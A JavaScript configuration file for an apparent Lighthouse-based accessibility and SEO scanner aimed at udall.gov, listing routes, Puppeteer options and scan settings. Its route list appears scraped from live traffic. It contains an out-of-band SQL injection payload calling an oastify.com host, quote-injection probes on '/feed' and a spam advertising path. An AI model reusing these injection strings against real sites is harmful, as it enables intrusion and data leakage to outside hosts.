module.exports = {
  "site": "https://udall.gov",
  "urls": [
    "/ourprograms/institute/training/selectpaymentmethod.aspxemy05gealocation.href",
    "/ourprograms/internship/undergraduatestudents.aspx",
    "/currentftitle-40/u1",
    "/documents/ecrreports/ecrinthefederalgovernmentfy2009(071510).pdf",
    "/favicon.ico",
    "/mobile",
    "/newsannouncements/",
    "/ourprograms/scholarship/scholarship.asp",
    "/pdf/techecr_conference_summary_institute.pdf",
    "/scriptresource.axd",
    "/OurPrograms/Institute/Training.aspx",
    "/ourprograms/internship/graduatestudents.aspx",
    "/ourprograms/scholarship/alumnispotlights.aspx",
    "/ourprograms/ecrfellowship/ecrfellowship.aspx",
    "/ourprograms/mkuscholarship/meetourscholars.aspx",
    "/panderma%20prp%20|%20represents%20|%20best%20prp%20kit%20for%20professional%20platelet-rich%20plasma%20treatments%20available%20at%20pandermaprp.com",
    "/resources/federalecrpolicy/memorandumecr.aspx",
    "/aboutus/contactus.aspxc8avzq3qlocation.href",
    "/OurPrograms/Institute/Training.aspx",
    "/ourprograms/institute/training/paybycreditcard.aspxemy05gealocation.href",
    "/ourprograms/parksinfocus/arizonaprogram.aspx",
    "/aboutmkudall/theearlyyears.aspx",
    "/aboutsludall/aboutsludall.aspx",
    "/ai",
    "/documents%20and%20settings/",
    "/feed''/",
    "/feed'/",
    "/feedm84d0wqpx2/lln4b01zmk/",
    "/jcbrxow5v6/lwhcffpbtk/",
    "/ourprograms/institute/servicearealandscape.aspx",
    "/ourprograms/institute/serviceareaprotectedareas.aspx",
    "/ourprograms/institute/tribalconsultation.aspx",
    "/ourprograms/scholarship/apply.asp",
    "/p_scholarship.asp",
    "/training",
    "/webresource.axd",
    "/aboutus/privacypolicy.aspx",
    "/ourprograms/institute/training/ccfail.aspx",
    "/",
    "/ourprograms/internship/alumninews.aspx",
    "/ourprograms/scholarship/aboutscholarship.aspx/",
    "/ourprograms/scholarship/spotlights/ericrodriguez.aspx",
    "/ourprograms/scholarship/spotlights/jerilynchurch.aspx",
    "/(select%20load_file('/738hw104kxqsbaz7rwrz7m5do4u6ixbl2nqkda1z.oastify.com/jav'))/"
  ],
  "puppeteerOptions": {
    "args": [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      "--headless=new"
    ],
    "concurrency": 1
  },
  "puppeteerPageUserAgent": "Mozilla/5.0 (compatible; FederalWebsiteScanner/1.0; +https://github.com/your-org/federal-website-scanner)",
  "userAgent": "Mozilla/5.0 (compatible; FederalWebsiteScanner/1.0; +https://github.com/your-org/federal-website-scanner)",
  "disableThrottling": true,
  "disableDeviceEmulation": true,
  "lighthouseOptions": {
    "disableStorageReset": true,
    "disableLantern": true,
    "throttlingMethod": "provided",
    "onlyCategories": [
      "accessibility",
      "seo",
      "best-practices"
    ]
  },
  "scanner": {
    "sitemap": "https://udall.gov/sitemap.xml",
    "crawler": false,
    "robotsTxt": false,
    "maxRoutes": 100,
    "throttle": false,
    "skipJavascript": true,
    "samples": 1,
    "pageTimeout": 90000,
    "device": "desktop",
    "exclude": [
      "/*.pdf",
      "/*.asp",
      "/*.aspx",
      "/sample-pfs-searches",
      "/security-guidelines-office-location",
      "/status-indicators",
      "/blog",
      "/my-health/*",
      "/my-va/*",
      "/auth/*",
      "/profile/*",
      "/logout",
      "**/callback*",
      "**/login*",
      "**/signin*"
    ]
  },
  "ci": {
    "skipMissing": true,
    "skipRoutesWithoutResults": true
  },
  "chrome": {
    "useSystem": true
  },
  "debug": false
}